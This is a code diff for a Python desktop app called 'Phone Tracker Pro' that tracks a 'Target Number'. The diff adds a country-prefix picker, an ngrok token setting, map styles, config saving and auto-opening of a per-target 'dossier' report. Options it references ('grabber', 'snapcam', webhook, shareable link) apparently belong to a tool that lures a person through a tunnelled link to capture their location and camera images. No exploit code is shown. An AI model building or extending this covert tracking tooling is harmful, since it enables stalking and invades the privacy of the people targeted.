@@ -15,7 +15,8 @@ class App(ctk.CTk):
     def __init__(self):
         super().__init__()
 
-        self.title("Phone Tracker Pro v5.0 - Intelligence UI")
+        self.title("Phone Tracker Pro v5.9 - Intelligence UI")
+        self.config_file = "config.json"
         self.geometry("1000x800")
         self.grid_columnconfigure(1, weight=1)
         self.grid_rowconfigure(0, weight=1)
@@ -28,10 +29,19 @@ class App(ctk.CTk):
         self.logo_label = ctk.CTkLabel(self.sidebar_frame, text="Tracker Pro", font=ctk.CTkFont(size=20, weight="bold"))
         self.logo_label.grid(row=0, column=0, padx=20, pady=(20, 10))
 
-        self.phone_label = ctk.CTkLabel(self.sidebar_frame, text="Target Number (+CC):")
+        self.phone_label = ctk.CTkLabel(self.sidebar_frame, text="Target Number:")
         self.phone_label.grid(row=1, column=0, padx=20, pady=(10, 0), sticky="w")
-        self.phone_entry = ctk.CTkEntry(self.sidebar_frame, placeholder_text="+1234567890")
-        self.phone_entry.grid(row=2, column=0, padx=20, pady=(0, 10), sticky="ew")
+        
+        self.phone_container = ctk.CTkFrame(self.sidebar_frame, fg_color="transparent")
+        self.phone_container.grid(row=2, column=0, padx=20, pady=(0, 10), sticky="ew")
+        self.phone_container.grid_columnconfigure(1, weight=1)
+        
+        self.prefix_var = ctk.StringVar(value="+56")
+        self.prefix_dropdown = ctk.CTkOptionMenu(self.phone_container, values=["+56", "+54", "+52", "+51", "+1", "+34", "+44", "+91"], variable=self.prefix_var, width=70)
+        self.prefix_dropdown.grid(row=0, column=0, padx=(0, 5))
+        
+        self.phone_entry = ctk.CTkEntry(self.phone_container, placeholder_text="932977690")
+        self.phone_entry.grid(row=0, column=1, sticky="ew")
 
         self.officer_label = ctk.CTkLabel(self.sidebar_frame, text="Officer / Webhook:")
         self.officer_label.grid(row=3, column=0, padx=20, pady=(10, 0), sticky="w")
@@ -160,17 +170,41 @@ class App(ctk.CTk):
         self.theme_dropdown = ctk.CTkOptionMenu(self.tabview.tab("Settings"), values=["Standard Grey", "Matrix Green", "Crimson Red", "FBI Blue"], variable=self.theme_var, command=self.change_theme)
         self.theme_dropdown.pack(pady=5, padx=20, anchor="w")
 
+        self.ngrok_label = ctk.CTkLabel(self.tabview.tab("Settings"), text="Ngrok Auth Token (Optional):", font=ctk.CTkFont(weight="bold"))
+        self.ngrok_label.pack(pady=(20, 5), padx=20, anchor="w")
+        self.ngrok_entry = ctk.CTkEntry(self.tabview.tab("Settings"), width=400, placeholder_text="Enter your authtoken...")
+        self.ngrok_entry.pack(pady=5, padx=20, anchor="w")
+
+        self.map_style_var = ctk.StringVar(value="Google Maps")
+        self.map_style_label = ctk.CTkLabel(self.tabview.tab("Settings"), text="Map Style:")
+        self.map_style_label.pack(pady=(20, 0), padx=20, anchor="w")
+        self.map_style_dropdown = ctk.CTkOptionMenu(self.tabview.tab("Settings"), values=["Google Maps", "OpenStreetMap", "Satellite"], variable=self.map_style_var, command=self.change_map_style)
+        self.map_style_dropdown.pack(pady=5, padx=20, anchor="w")
+
+        self.auto_dossier_var = ctk.BooleanVar(value=True)
+        self.auto_dossier_cb = ctk.CTkCheckBox(self.tabview.tab("Settings"), text="Auto-Open Dossier (after collection)", variable=self.auto_dossier_var)
+        self.auto_dossier_cb.pack(pady=10, padx=20, anchor="w")
+
+        self.save_settings_btn = ctk.CTkButton(self.tabview.tab("Settings"), text=" SAVE SETTINGS", fg_color="#228822", hover_color="#1a661a", command=self.manual_save)
+        self.save_settings_btn.pack(pady=20, padx=20, anchor="w")
+
         self.process = None
         self.target_count = 0
         self.load_history()
+        self.load_config()
 
     def load_config(self):
-        config_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), self.config_file)
+        if getattr(sys, 'frozen', False):
+            base_dir = os.path.dirname(sys.executable)
+        else:
+            base_dir = os.path.dirname(os.path.abspath(__file__))
+        config_path = os.path.join(base_dir, self.config_file)
         if os.path.exists(config_path):
             try:
                 with open(config_path, 'r') as f:
                     config = json.load(f)
                 self.phone_entry.insert(0, config.get("phone", ""))
+                self.prefix_var.set(config.get("prefix", "+56"))
                 self.officer_entry.insert(0, config.get("officer", ""))
                 self.case_entry.insert(0, config.get("case_id", ""))
                 self.grabber_var.set(config.get("grabber", False))
@@ -180,15 +214,25 @@ class App(ctk.CTk):
                 self.sound_alert_var.set(config.get("sound_alert", True))
                 self.snapcam_var.set(config.get("snapcam", False))
                 self.theme_var.set(config.get("theme", "Standard Grey"))
+                self.ngrok_entry.insert(0, config.get("ngrok_token", ""))
+                self.map_style_var.set(config.get("map_style", "Google Maps"))
+                self.auto_dossier_var.set(config.get("auto_dossier", True))
+                
                 self.change_theme(self.theme_var.get())
+                self.change_map_style(self.map_style_var.get())
                 self.append_text("[CONFIG] Settings loaded from file.\n")
             except Exception as e:
                 self.append_text(f"[CONFIG] Error loading: {e}\n")
 
     def save_config(self):
-        config_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), self.config_file)
+        if getattr(sys, 'frozen', False):
+            base_dir = os.path.dirname(sys.executable)
+        else:
+            base_dir = os.path.dirname(os.path.abspath(__file__))
+        config_path = os.path.join(base_dir, self.config_file)
         config = {
             "phone": self.phone_entry.get(),
+            "prefix": self.prefix_var.get(),
             "officer": self.officer_entry.get(),
             "case_id": self.case_entry.get(),
             "grabber": self.grabber_var.get(),
@@ -197,7 +241,10 @@ class App(ctk.CTk):
             "webhook": self.webhook_entry.get(),
             "sound_alert": self.sound_alert_var.get(),
             "snapcam": self.snapcam_var.get(),
-            "theme": self.theme_var.get()
+            "theme": self.theme_var.get(),
+            "ngrok_token": self.ngrok_entry.get(),
+            "map_style": self.map_style_var.get(),
+            "auto_dossier": self.auto_dossier_var.get()
         }
         try:
             with open(config_path, 'w') as f:
@@ -205,12 +252,25 @@ class App(ctk.CTk):
         except Exception as e:
             self.append_text(f"[CONFIG] Error saving: {e}\n")
 
+    def manual_save(self):
+        self.save_config()
+        self.append_text("[CONFIG] Settings saved manually.\n")
+
     def change_theme(self, choice):
         colors = {"Standard Grey": "#ffffff", "Matrix Green": "#00ff00", "Crimson Red": "#ff3333", "FBI Blue": "#3399ff"}
         prog_colors = {"Standard Grey": "red", "Matrix Green": "#00aa00", "Crimson Red": "darkred", "FBI Blue": "navy"}
         self.console_textbox.configure(text_color=colors.get(choice, "white"))
         self.progress.configure(progress_color=prog_colors.get(choice, "red"))
 
+
+    def change_map_style(self, choice):
+        if choice == "Google Maps":
+            self.map_widget.set_tile_server("https://mt0.google.com/vt/lyrs=m&hl=en&x={x}&y={y}&z={z}&s=Ga")
+        elif choice == "OpenStreetMap":
+            self.map_widget.set_tile_server("https://a.tile.openstreetmap.org/{z}/{x}/{y}.png")
+        elif choice == "Satellite":
+            self.map_widget.set_tile_server("https://mt0.google.com/vt/lyrs=s&hl=en&x={x}&y={y}&z={z}&s=Ga")
+        self.append_text(f"[SYSTEM] Map style changed to: {choice}\n")
 
     def copy_link(self):
         link = self.link_entry.get()
@@ -489,12 +549,18 @@ class App(ctk.CTk):
         for widget in self.history_frame.winfo_children():
             widget.destroy()
         
-        if not os.path.exists("output"):
+        if getattr(sys, 'frozen', False):
+            base_dir = os.path.dirname(sys.executable)
+        else:
+            base_dir = os.path.dirname(os.path.abspath(__file__))
+        output_dir = os.path.join(base_dir, "output")
+            
+        if not os.path.exists(output_dir):
             l = ctk.CTkLabel(self.history_frame, text="No cases found.")
             l.pack(pady=10)
             return
             
-        files = glob.glob("output/*.json")
+        files = glob.glob(os.path.join(output_dir, "*.json"))
         if not files:
             l = ctk.CTkLabel(self.history_frame, text="No scan reports found.")
             l.pack(pady=10)
@@ -520,20 +586,28 @@ class App(ctk.CTk):
         self.load_history()
 
     def start_scan(self):
+        # combine prefix and phone
+        prefix = self.prefix_var.get()
         phone = self.phone_entry.get().strip()
+        
         if not phone:
             self.append_text("[ERROR] Please enter a target phone number.\n")
             return
 
+        full_phone = prefix + phone
+        
+        # Save config on start
+        self.save_config()
+
         self.start_button.configure(state="disabled")
-        self.stop_button.configure(state="normal")
+        self.stop_button.configure(state="normal", fg_color="red")
         self.console_textbox.configure(state="normal")
         self.console_textbox.delete("0.0", "end")
         self.console_textbox.configure(state="disabled")
         self.progress.set(0.1)
 
-        self.append_text(f"Starting tracking for {phone}...\n")
-        threading.Thread(target=self._run_internal, args=(phone,), daemon=True).start()
+        self.append_text(f"Starting tracking for {full_phone}...\n")
+        threading.Thread(target=self._run_internal, args=(full_phone,), daemon=True).start()
 
     def stop_scan(self):
         self.append_text("\n[STOPPING PROCESS...]\n")
@@ -589,6 +663,8 @@ class App(ctk.CTk):
             os.environ["TEMPLATE_CHOICE"] = self.template_var.get()
             os.environ["PLAY_SOUND"] = "1" if self.sound_alert_var.get() else "0"
             os.environ["ENABLE_SNAPCAM"] = "1" if self.snapcam_var.get() else "0"
+            if self.ngrok_entry.get().strip():
+                os.environ["NGROK_AUTHTOKEN"] = self.ngrok_entry.get().strip()
 
             self.after(0, self.append_text, f"[DEBUG 4] Setting up callbacks, argv={argv}\n")
             
@@ -602,6 +678,20 @@ class App(ctk.CTk):
                 from rich.console import Console
                 phone_tracker.console = Console(file=stream, force_terminal=False, color_system=None)
                 phone_tracker.main()
+            
+            # Auto-Open Dossier Logic
+            if self.auto_dossier_var.get():
+                try:
+                    import glob, webbrowser
+                    # Look for the latest matching report in output/
+                    clean_num = phone.replace("+", "")
+                    reports = glob.glob(f"output/phone_intel_{clean_num}_*.html")
+                    if reports:
+                        latest_report = sorted(reports)[-1]
+                        self.after(0, self.append_text, f"[SYSTEM] Auto-opening dossier: {latest_report}\n")
+                        webbrowser.open(os.path.abspath(latest_report))
+                except Exception as ex:
+                    self.after(0, self.append_text, f"[WARN] Failed to auto-open report: {ex}\n")
                 
             self.after(0, self.append_text, "[DEBUG 6] main() completed normally\n")
         except Exception as e:
